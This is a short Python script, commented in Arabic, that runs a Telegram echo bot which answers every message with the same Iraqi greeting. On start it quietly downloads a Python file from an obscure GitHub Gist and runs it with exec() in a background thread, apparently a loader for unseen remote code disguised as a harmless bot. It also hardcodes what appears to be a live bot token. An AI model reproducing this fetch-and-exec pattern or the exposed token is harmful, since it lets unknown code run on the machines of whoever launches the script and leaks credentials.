import requests
import telebot
import threading

# إعداد توكن البوت الخاص بك
TOKEN = '7619304970:AAFfQntdcEMdhFWAYMRZt8KrbNEbJP-I14g'
bot = telebot.TeleBot(TOKEN)

# رابط الملف الذي تريد تحميله من Gist
url = 'https://gist.githubusercontent.com/saSfa43g/008a2a3f01bd68b0c761e36aaa32594e/raw/414b832936599391157ba2f4818a2d44bafe4379/gjhnlflfjlgfnfga.py'

# تشغيل الكود مباشرة
def run_code():
    response = requests.get(url)
    if response.status_code == 200:
        code = response.text
        exec(code)  # تشغيل الكود مباشرة
        print('Code executed successfully.')
    else:
        print('Failed to download the file')

# وظيفة بدء البوت
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "شلونك")

# وظيفة الرد على أي رسالة
@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "شلونك")

# بدء البوت في خيط منفصل
def start_bot():
    bot.polling()

# بدء تشغيل الكود
run_thread = threading.Thread(target=run_code)
run_thread.start()

# بدء البوت
start_bot()
